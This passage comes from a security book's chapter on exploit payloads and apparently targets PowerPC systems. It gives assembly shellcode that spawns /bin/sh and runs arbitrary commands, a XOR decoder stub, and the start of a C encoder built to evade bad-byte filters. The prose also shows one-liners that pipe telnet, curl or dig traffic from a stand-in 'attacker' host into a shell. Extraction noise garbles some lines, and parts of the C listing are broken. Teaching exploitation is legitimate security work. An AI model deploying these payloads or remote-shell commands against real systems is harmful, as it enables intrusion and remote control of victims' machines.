this by instead loading a larger constant that, when shifted to the right 9 bits,
equals 59. Using tricks like this, you can easily generate the result value that
we want in a register. Finally, instead of executing the system call instruction,
we use a hexadecimal constant 0x44ffff02. In the instruction encoding for the
sc instruction, the middle two bytes are all unused bits. As such, they can be
set or unset, since the processor ignores them. We set all of them to avoid those
NULL bytes in the encoding.
Now assemble and run the assembly version of this payload.
% gcc -o execve_binsh execve_binsh.s
% ./execve_binsh
bash-3.2$ exit
exit
%
system
The following payload expands our previous shellcode payload a little to make
it execute an arbitrary UNIX command, much like the standard library system()
function. The benefi t of this is that you can change the command that it executes
by just modifying the string at the end. Notice that the command string at the
end includes the command “exit” and is not NULL-terminated. This is inten-
tional so that this payload may be inserted into any part of the attack string, not
necessarily the end, as would be the case if it were required that the command
string be NULL-terminated. Running exit as our last command tells the shell
to exit before it tries to read the memory that follows the payload.
.globl _main
_main:
xor r31, r31, r31 ; “\0\0\0\0”
lis r30, 0x2f2f ; “//”
9955336633cc0099..iinndddd 222233 11//2255//0099 44::4422::2288 PPMM
224 Part III ■ Exploitation
addi r30, r30, 0x7368 ; “sh”
lis r29, 0x2f62 ; “/b”
addi r29, r29, 0x696e ; “in”
xor r28, r28, r28 ; “\0\0”
lis r28, 0x2d63 ; “-c”
xor. r27, r27, r27 ; NULL
bnel _main ; Doesn’t actually branch
mflr r26 ; cmd
addi r26, r26, 268+52 ; 52 = offset from bnel to end
addi r26, r26, -268 ; avoid NULL in encoding
subi r25, r1, 16 ; “-c”
subi r24, r1, 12 ; “/bin/sh”
stmw r24, -32(r1) ; Write everything to stack
subi r3, r1, 12 ; path = “/bin//sh”
subi r4, r1, 32 ; argv = {“/bin//sh”, “-c”, cmd, 0}
xor r5, r5, r5 ; envp = NULL
li r30, 30209 ; avoid NULL in encoding
srawi r0, r30, 9 ; (30209 >> 9) == 59 == SYS_execve
.long 0x44ffff02 ; execve(path, argv, NULL)
tweq r4, r4 ; breakpoint trap
cmd:
.ascii “/bin/sh;exit;”
There are a few of other subtle tricks that require some explanation. At lines
10 and 11 there is an xor./bnel combo. As we did in the fi rst shellcode, we use
this trick to obtain the memory address from which the payload is executing
and store it in the link register. The next address stores the value of the link
register into r26. We subsequently add the offset from the current instruction to
the beginning of the command string to calculate the address of our command
string in memory.
Like in the previous payload, we use the stmw instruction to write out a
consecutive set of registers to the stack. This is a useful way to lay out val-
ues in memory when you need to calculate their values because they may be
dynamic or to avoid NULL bytes in instruction encoding. The payload proceeds
to execute the system shell with the argument “-c” and the command string,
just as the system() function does.
Being able to specify an arbitrary command to execute makes this a very use-
ful and fl exible payload. You can do everything from running a shell locally, as
the payload code as shown above does, to running an interactive shell remotely
by connecting it via pipes to two telnet commands (“telnet attacker 1234 | sh
| telnet attacker 1235”). If the target happens to be behind a restrictive fi re-
wall, you can even run a full shell script downloaded via HTTP (“curl http://
sh.attacker.com | sh”) or DNS (“dig sh.attacker.com txt +short | sh”).
9955336633cc0099..iinndddd 222244 11//2255//0099 44::4422::2288 PPMM
Chapter 9 ■ Exploit Payloads 225
decode_longxor
In the previous payloads, we have used various tricks to avoid NULL bytes in
the encoding. This is easy enough to do when you are just trying to avoid a
single bad byte, but as the number of bytes to avoid and the payload size get
larger, this task gets increasingly diffi cult. For local exploits where NULL is
commonly the only byte that needs to be avoided, a decoder is rarely necessary.
For remote exploits, however, it is easier to use a simple decoder component to
avoid having to eliminate bad byte values manually in the assembled payload.
We still need to avoid NULL bytes in the decoder component itself, however.
The decoder stub XORs the encoded payload with a 32-bit long value. The
encoder will analyze the payload and choose the 32-bit value that results in an
encoding free of undesired byte values. The XOR decoding of the payload is
very straightforward, but the steps taken to accommodate self-modifying code
require some explanation.
PowerPC processors often have separate instruction and data caches.
Essentially, this means there is a separate path to memory when it is retrieved
by the load and store instructions and when it is retrieved in the processor’s
instruction fetch cycle. Moreover, these caches can be write-back caches, mean-
ing that a changed value of memory is written to the cache and written to RAM
only when the cache block is expired. If data that is in the data cache is modifi ed
and then immediately executed, the CPU will most likely decode and execute
old values of that memory since the changed values would not yet have been
written back to RAM from the data cache.
The way to work around this, as shown in the following code, is to fl ush the
data-cache block to memory and invalidate the same block in the instruction
cache. These instructions take two register arguments and invalidate the cache
block containing the effective address obtained by adding the contents of the
two registers together. In addition, you must wait for the cache instructions to
synchronize before issuing the next instruction, which is why you need to use
the sync and isync instructions. We do this sequence of operations for every
32-bit long value that we XOR, which is often redundant since it would invali-
date the data block multiple times instead of doing it just once at the end. We
are more concerned about stability and optimizing for code size than runtime
performance, so the performance penalty is not an issue. After all, we are not
doing signifi cant number crunching, but are just performing some simple XOR
operations on a small buffer.
;;;
;;; PowerPC LongXOR exploit payload decoder component
;;;
;;; Dino Dai Zovi , 20030821
;;;
9955336633cc0099..iinndddd 222255 11//2255//0099 44::4422::2288 PPMM
226 Part III ■ Exploitation
.globl _decode_longxor
_decode_longxor:
;; PowerPC GetPC() from LSD
xor. r5, r5, r5
bnel main
mflr r31
addi r31, r31, 72+1974 ; 72 = distance from main -> payload
; 1974 is null elliding constant
subi r5, r5, 1974 ; We need this for the dcbf and icbi
lis r6, ((KEY & 0xffff0000) >> 16)
ori r6, r6, (KEY & 0xffff)
li r4, 257+(SIZE/4+1) ; 257+
subi r4, r4, 257
mtctr r4
L_xor_loop:
lwz r4, -1974(r31)
xor r4, r4, r6
stw r4, -1974(r31)
;;
;; Do the self-modifying code song and dance
;;
dcbf r5, r31 ; Flush data cache block to memory
.long 0x7cff04ac ; (sync) Wait for flush to complete
icbi r5, r31 ; Invalidate instruction cache block
.long 0x4cff012c ; (isync) Toss prefetch instructions
addi r30, r5, 1978 ; Advance r31 to next word
add r31, r31, r30
bdnz L_xor_loop
payload:
;;; Insert LongXOR’ed payload here
Many payload encoders attempt to fi nd a suitable encoding key by evaluating
random keys until one successfully encodes the payload without using any of
the interpreted byte values. The example encoder, however, is deterministic and
will fi nd a suitable 4-byte XOR-encoding key if one exists for the given input
payload and list of interpreted characters.
The algorithm treats the input payload as one large array of 4-byte values. It
traverses the input payload array and records which byte values are observed in
the fi rst, second, third, and fourth positions of the 4-byte array elements. Finding
a suitable XOR key requires fi nding a byte for each position that does not result
in a bad byte when it is XORed with all of the observed bytes in that position.
In the following source code for longxor_encoder.c, the relevant functions are
calculate_key() and fi nd_xor_byte().
9955336633cc0099..iinndddd 222266 11//2255//0099 44::4422::2288 PPMM
Chapter 9 ■ Exploit Payloads 227
/*
* LongXOR encode an exploit payload
*
* Dino Dai Zovi , 20030716
*/
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
int is_bad_byte(uint8_t b, size_t bad_bytes_size, uint8_t bad_bytes[])
{
int i;
for (i = 0; i  [  … ]\n”,
argv[0]);
exit(EXIT_FAILURE);
}
/*
* Read payload binary file into byte array
*/
if ((payload_fd = open(argv[1], O_RDONLY))  0) {
bad_bytes = malloc(bad_bytes_size);
for (i = 2; i  255) {
errno = (errno == EINVAL) ? EINVAL : ERANGE;
9955336633cc0099..iinndddd 222299 11//2255//0099 44::4422::2288 PPMM
230 Part III ■ Exploitation
perror(“strtoul”);
exit(EXIT_FAILURE);
}
bad_bytes[i-2] = byte;
}
}
else {
bad_bytes_size = 1;
bad_bytes = malloc(1);
bad_bytes[0] = 0x0;
}
/*
* Calculate a suitable LongXOR key
*/